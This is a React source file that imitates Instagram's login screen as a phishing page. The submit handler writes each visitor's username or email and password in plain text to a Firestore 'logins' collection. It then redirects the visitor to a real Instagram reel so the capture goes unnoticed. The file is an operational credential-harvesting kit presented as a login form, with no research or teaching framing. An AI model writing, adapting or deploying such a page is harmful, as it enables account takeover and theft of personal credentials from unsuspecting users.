// InstagramLogin.js
import React, { useState } from "react";
import "./InstagramLogin.css";
import { FaFacebookSquare } from "react-icons/fa";
import { db } from "./firebase"; // Ensure correct import path

import { collection, addDoc } from "firebase/firestore/lite";

const InstagramLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const submitHandler = async (e) => {
    e.preventDefault();
    try {
      // Save data to Firebase
      const loginsCollection = collection(db, "logins"); // Ensure collection reference is correct
      await addDoc(loginsCollection, {
        email,
        password,
        timestamp: new Date(),
      });

      // Redirect to the specified link
      window.location.href =
        "https://www.instagram.com/reel/C6gNCFpL0Oj/?utm_source=ig_web_copy_link";
    } catch (error) {
      console.error("Error saving data:", error);
    }
  };

  return (
    <div className="instagram-login">
      <div className="login-container">
        <img src="./1.png" alt="img" />

        <form onSubmit={submitHandler}>
          <input
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            type="text"
            placeholder="Phone number, username, or email"
            required
          />
          <input
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            type="password"
            placeholder="Password"
            required
          />
          <div className="login-button-container">
            <button type="submit" className="login-button">
              Log in
            </button>
          </div>
        </form>
        <div className="or-divider">
          <span>OR</span>
        </div>
        <button className="facebook-login">
          <div>
            <FaFacebookSquare />
            Log in with Facebook
          </div>
        </button>
        <span className="forgot-password">Forgot password?</span>
      </div>
      <div className="signup-container">
        <p>
          Don't have an account? <span>Sign up</span>
        </p>
      </div>
    </div>
  );
};

export default InstagramLogin;
